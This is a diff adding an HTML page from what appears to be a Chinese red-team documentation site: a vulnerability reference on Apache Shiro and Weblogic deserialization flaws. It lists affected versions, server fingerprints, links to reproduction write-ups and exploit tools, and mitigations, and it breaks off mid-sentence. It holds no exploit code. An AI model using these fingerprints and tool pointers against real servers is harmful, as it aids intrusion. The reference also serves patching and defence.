@@ -1,0 +1,2237 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.8">
+    
+    
+      
+        <title>漏洞库 - klsfct Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.6e60f8b8.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#000000">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../js/stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="black" data-md-color-accent="deep-orange">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#shiro" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="klsfct Docs" class="md-header__button md-logo" aria-label="klsfct Docs" data-md-component="logo">
+      
+  <img src="../../images/logo.jpg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            klsfct Docs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              漏洞库
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../.." class="md-tabs__link">
+      主页
+    </a>
+  </li>
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-tabs__link md-tabs__link--active">
+        红队
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../blueteam/%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
+        蓝队
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../about/aboutme/" class="md-tabs__link">
+        About
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="klsfct Docs" class="md-nav__button md-logo" aria-label="klsfct Docs" data-md-component="logo">
+      
+  <img src="../../images/logo.jpg" alt="logo">
+
+    </a>
+    klsfct Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        主页
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          红队
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="红队" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          红队
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-nav__link">
+        目录
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-nav__link">
+        信息收集
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          漏洞库
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        漏洞库
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#shiro" class="md-nav__link">
+    shiro类
+  </a>
+  
+    <nav class="md-nav" aria-label="shiro类">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#apache-shiro" class="md-nav__link">
+    Apache shiro 反序列化漏洞
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#weblogic" class="md-nav__link">
+    weblogic相关
+  </a>
+  
+    <nav class="md-nav" aria-label="weblogic相关">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#weblogic-t3" class="md-nav__link">
+    Weblogic T3 反序列化漏洞
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fastjson" class="md-nav__link">
+    Fastjson反序列化
+  </a>
+  
+    <nav class="md-nav" aria-label="Fastjson反序列化">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fastjson-1222-1224" class="md-nav__link">
+    Fastjson 1.2.22 - 1.2.24 反序列化漏洞
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#struts" class="md-nav__link">
+    Struts系列漏洞
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solr" class="md-nav__link">
+    Solr系列
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tomcat" class="md-nav__link">
+    Tomcat类
+  </a>
+  
+    <nav class="md-nav" aria-label="Tomcat类">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tomcat-cve-2020-1938" class="md-nav__link">
+    Tomcat 本地文件包含漏洞 (CVE-2020-1938)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session" class="md-nav__link">
+    session反序列化漏洞分析
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#redis" class="md-nav__link">
+    Redis相关
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#zabbix" class="md-nav__link">
+    Zabbix相关
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jenkins" class="md-nav__link">
+    Jenkins相关
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kibana" class="md-nav__link">
+    Kibana相关
+  </a>
+  
+    <nav class="md-nav" aria-label="Kibana相关">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#kibanacve-2019-7609" class="md-nav__link">
+    Kibana远程代码执行漏洞(CVE-2019-7609)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kibanacve-2018-17246" class="md-nav__link">
+    Kibana漏洞CVE-2018-17246
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oa" class="md-nav__link">
+    泛微OA相关
+  </a>
+  
+    <nav class="md-nav" aria-label="泛微OA相关">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#oa_1" class="md-nav__link">
+    泛微OA系统多版本存在命令执行漏洞
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#e-cology-oasql" class="md-nav__link">
+    泛微E-cology OA系统SQL注入漏洞
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vpn" class="md-nav__link">
+    深信服VPN相关
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oa_2" class="md-nav__link">
+    通达OA相关
+  </a>
+  
+    <nav class="md-nav" aria-label="通达OA相关">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#oa_3" class="md-nav__link">
+    通达OA任意用户登录漏洞
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#oa_4" class="md-nav__link">
+    通达OA命令执行漏洞
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#oa_5" class="md-nav__link">
+    通达OA扫码登录任意用户登录
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#coremail" class="md-nav__link">
+    Coremail漏洞相关
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#saltstack" class="md-nav__link">
+    SaltStack漏洞相关
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oa_6" class="md-nav__link">
+    致远OA漏洞相关
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    历史漏洞相关信息
+  </a>
+  
+    <nav class="md-nav" aria-label="历史漏洞相关信息">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cve-2020-0796" class="md-nav__link">
+    CVE-2020-0796 永恒之黑漏洞相关
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/" class="md-nav__link">
+        溯源分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../钓鱼.md" class="md-nav__link">
+        钓鱼
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-nav__link">
+        信息收集
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-nav__link">
+        信息收集
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blueteam/styling-your-docs.md" class="md-nav__link">
+        Styling your docs
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" data-md-state="indeterminate" type="checkbox" id="__nav_3" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          蓝队
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="蓝队" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          蓝队
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blueteam/%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-nav__link">
+        目录
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-nav__link">
+        信息收集
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blueteam/漏洞库.md" class="md-nav__link">
+        漏洞库
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-nav__link">
+        信息收集2
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-nav__link">
+        信息收集
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" data-md-state="indeterminate" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          About
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="About" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          About
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../about/aboutme/" class="md-nav__link">
+        about me
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#shiro" class="md-nav__link">
+    shiro类
+  </a>
+  
+    <nav class="md-nav" aria-label="shiro类">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#apache-shiro" class="md-nav__link">
+    Apache shiro 反序列化漏洞
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#weblogic" class="md-nav__link">
+    weblogic相关
+  </a>
+  
+    <nav class="md-nav" aria-label="weblogic相关">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#weblogic-t3" class="md-nav__link">
+    Weblogic T3 反序列化漏洞
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fastjson" class="md-nav__link">
+    Fastjson反序列化
+  </a>
+  
+    <nav class="md-nav" aria-label="Fastjson反序列化">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fastjson-1222-1224" class="md-nav__link">
+    Fastjson 1.2.22 - 1.2.24 反序列化漏洞
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#struts" class="md-nav__link">
+    Struts系列漏洞
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solr" class="md-nav__link">
+    Solr系列
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tomcat" class="md-nav__link">
+    Tomcat类
+  </a>
+  
+    <nav class="md-nav" aria-label="Tomcat类">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tomcat-cve-2020-1938" class="md-nav__link">
+    Tomcat 本地文件包含漏洞 (CVE-2020-1938)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session" class="md-nav__link">
+    session反序列化漏洞分析
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#redis" class="md-nav__link">
+    Redis相关
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#zabbix" class="md-nav__link">
+    Zabbix相关
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jenkins" class="md-nav__link">
+    Jenkins相关
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kibana" class="md-nav__link">
+    Kibana相关
+  </a>
+  
+    <nav class="md-nav" aria-label="Kibana相关">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#kibanacve-2019-7609" class="md-nav__link">
+    Kibana远程代码执行漏洞(CVE-2019-7609)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kibanacve-2018-17246" class="md-nav__link">
+    Kibana漏洞CVE-2018-17246
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oa" class="md-nav__link">
+    泛微OA相关
+  </a>
+  
+    <nav class="md-nav" aria-label="泛微OA相关">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#oa_1" class="md-nav__link">
+    泛微OA系统多版本存在命令执行漏洞
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#e-cology-oasql" class="md-nav__link">
+    泛微E-cology OA系统SQL注入漏洞
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vpn" class="md-nav__link">
+    深信服VPN相关
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oa_2" class="md-nav__link">
+    通达OA相关
+  </a>
+  
+    <nav class="md-nav" aria-label="通达OA相关">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#oa_3" class="md-nav__link">
+    通达OA任意用户登录漏洞
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#oa_4" class="md-nav__link">
+    通达OA命令执行漏洞
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#oa_5" class="md-nav__link">
+    通达OA扫码登录任意用户登录
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#coremail" class="md-nav__link">
+    Coremail漏洞相关
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#saltstack" class="md-nav__link">
+    SaltStack漏洞相关
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oa_6" class="md-nav__link">
+    致远OA漏洞相关
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    历史漏洞相关信息
+  </a>
+  
+    <nav class="md-nav" aria-label="历史漏洞相关信息">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cve-2020-0796" class="md-nav__link">
+    CVE-2020-0796 永恒之黑漏洞相关
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+  <h1>漏洞库</h1>
+
+<p>日常exp</p>
+<h2 id="shiro">shiro类<a class="headerlink" href="#shiro" title="Permanent link">&para;</a></h2>
+<h3 id="apache-shiro">Apache shiro 反序列化漏洞<a class="headerlink" href="#apache-shiro" title="Permanent link">&para;</a></h3>
+<p>Shiro-550, Shiro-721</p>
+<ol>
+<li>漏洞简介
+Apache 
+Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和
+会话管理。</li>
+<li>影响范围
+Apache Shiro &lt;= 
+1.2.4 如 果 shiro 的 rememberMe 功 能 的 AES 密 钥 被 泄 露 , 
+就会导致反序列化漏洞，无论Shiro是什么版本。</li>
+<li>漏洞特征
+set-Cookie: 
+rememberMe=deleteMe或者URL中有shiro字样，有一些时候服务器
+不会主动返回 rememberMe=deleteMe直接发包即可</li>
+<li>漏洞复现
+Shiro RememberMe 1.2.4 反序列化漏洞详细复现
+<a href="https://www.cnblogs.com/paperpen/p/11312671.html">https://www.cnblogs.com/paperpen/p/11312671.html</a>
+Shiro反序列化漏洞利用汇总（Shiro-550+Shiro-721）
+<a href="https://www.cnblogs.com/xiaozi/p/13239046.html">https://www.cnblogs.com/xiaozi/p/13239046.html</a>
+Shiro RememberMe 1.2.4反序列化导致的命令执行漏洞
+<a href="https://paper.seebug.org/shiro-rememberme-1-2-4/#0x01">https://paper.seebug.org/shiro-rememberme-1-2-4/#0x01</a>
+Shiro RememberMe 1.2.4 反 序 列 化 漏 洞 (Shiro-550, CVE-2016-
+4437)复现
+<a href="https://blog.csdn.net/qq_43645782/article/details/106028873">https://blog.csdn.net/qq_43645782/article/details/106028873</a>
+Shiro 721 Padding Oracle攻击漏洞分析
+<a href="https://www.anquanke.com/post/id/193165">https://www.anquanke.com/post/id/193165</a></li>
+<li>利用工具
+ShiroExploit
+<a href="https://github.com/feihong-cs/ShiroExploit">https://github.com/feihong-cs/ShiroExploit</a>
+Shiro_exploit
+<a href="https://github.com/insightglacier/Shiro_exploit/blob/master/shiro_ex">https://github.com/insightglacier/Shiro_exploit/blob/master/shiro_ex</a>
+ploit.py</li>
+<li>防护方法
+升级Shiro到最新版升级对应JDK版本到 8u191/7u201/6u211/11.0.1 
+以上WAF拦截Cookie中长度过大的rememberMe值
+Apache Shiro 权限绕过漏洞 (Shiro-682)</li>
+<li>漏洞简介
+漏 洞 初 始 成 因 可 以 定 位 到
+PathMatchingFilterChainResolver的getChain函数下，该函数作用根
+据URL路径匹配中配置的url路径表达式来匹配输入的URL，判断是否
+匹配拦截器，匹配成功将会返回响应的拦截器执行链，让ShiroFither执
+行权限操作。</li>
+<li>影响范围
+Apache Shiro &lt; 1.5.2</li>
+<li>漏洞特征
+set-Cookie: 
+rememberMe=deleteMe或者URL中有shiro字样，有一些时候服务器
+不会主动返回 rememberMe=deleteMe 直接发包即可</li>
+<li>漏洞复现
+Shiro权限绕过漏洞分析（CVE-2020-1957）
+<a href="https://www.freebuf.com/vuls/231909.html">https://www.freebuf.com/vuls/231909.html</a></li>
+<li>防护方法
+      升级1.5.2版本及以上尽量避免使用通配符作为动态路由拦截器的URL
+      路径表达式.</li>
+</ol>
+<h2 id="weblogic">weblogic相关<a class="headerlink" href="#weblogic" title="Permanent link">&para;</a></h2>
+<h3 id="weblogic-t3">Weblogic T3 反序列化漏洞<a class="headerlink" href="#weblogic-t3" title="Permanent link">&para;</a></h3>
+<ol>
+<li>
+<p>漏洞简介
+    Weblogic Server 中 的 RMI 通 信 使 用 T3 协 议 在 Weblogic 
+    Server 和 其 它 Java 程 序 （ 客 户 端 或 者 其 它 Weblogic 
+    Server 实 例 ） 之 间 传 输 数 据 , 
+    服务器实例会跟踪连接到应用程序的每个Java 虚拟机（JVM ）中, 
+    并 创 建 T3 协 议 通 信 连 接 , 将 流 量 传 输 到 Java 虚 拟 机 . 
+    T3 协 议 在 开 放 WebLogic 控 制 台 端 口 的 应 用 上 默 认 开 启 . 
+    攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 
+    实现对存在漏洞的weblogic组件的远程代码执行攻击.</p>
+</li>
+<li>
+<p>影响范围
+    Weblogic 10.3.6.0.0
+    Weblogic 12.1.3.0.0
+    Weblogic 12.2.1.3.0</p>
+</li>
+<li>
+<p>漏洞特征
+    可以根据weblogic的报错页面作为特征：
+    The server has not found anything matching the Request-URI.No 
+    indication is given of whether the condition is temporary or 
+    permanent.······</p>
+</li>
+<li>
+<p>漏洞复现
+    Weblogic t3反序列化漏洞(CVE-2019-2890)分析
+    <a href="http://gv7.me/articles/2019/cve-2019-2890-vulnerability-analysis/">http://gv7.me/articles/2019/cve-2019-2890-vulnerability-analysis/</a>
+   Weblogic T3协议反序列化漏洞（CVE-2018-2628）
+    <a href="https://blog.csdn.net/Aaron_Miller/article/details/106657746">https://blog.csdn.net/Aaron_Miller/article/details/106657746</a>
+    相关漏洞包括：
+    CVE-2017-3248
+    <a href="https://paper.seebug.org/333/">https://paper.seebug.org/333/</a>
+    CVE-2018-2628
+    <a href="https://paper.seebug.org/985/">https://paper.seebug.org/985/</a>
+    CVE-2018-2893
+    <a href="https://www.freebuf.com/vuls/178105.html">https://www.freebuf.com/vuls/178105.html</a>
+    CVE-2019-2890
+    <a href="https://paper.seebug.org/1069/">https://paper.seebug.org/1069/</a>
+    CVE-2020-2555(Oracle Coherence)
+    <a href="https://paper.seebug.org/1141/">https://paper.seebug.org/1141/</a></p>
+</li>
+<li>
+<p>利用工具
+    weblogic 漏洞扫描工具
+    <a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p>
+</li>
+<li>
+<p>防护方法
+    及 时 更 新 补 丁 禁 用 T3 协 议 禁 止 T3 端 口 对 外 开 放 , 
+    或者限制可访问T3端口的IP来源
+    Weblogic XMLDecoder反序列化</p>
+</li>
+<li>
+<p>漏洞简介
+    WebLogic 中 默 认 包 含 的 wls-wast 与 wls9_async_response war 
+    包 ， 由 于 以 上 WAR 包 采 用 XMLDecoder 
+    反 序 列 化 机 制 来 处 理 发 送 过 来 的 XML 
+    数 据 ， 远 程 恶 意 攻 击 者 可 以 通 过 发 送 精 心 构 造 的 HTTP 
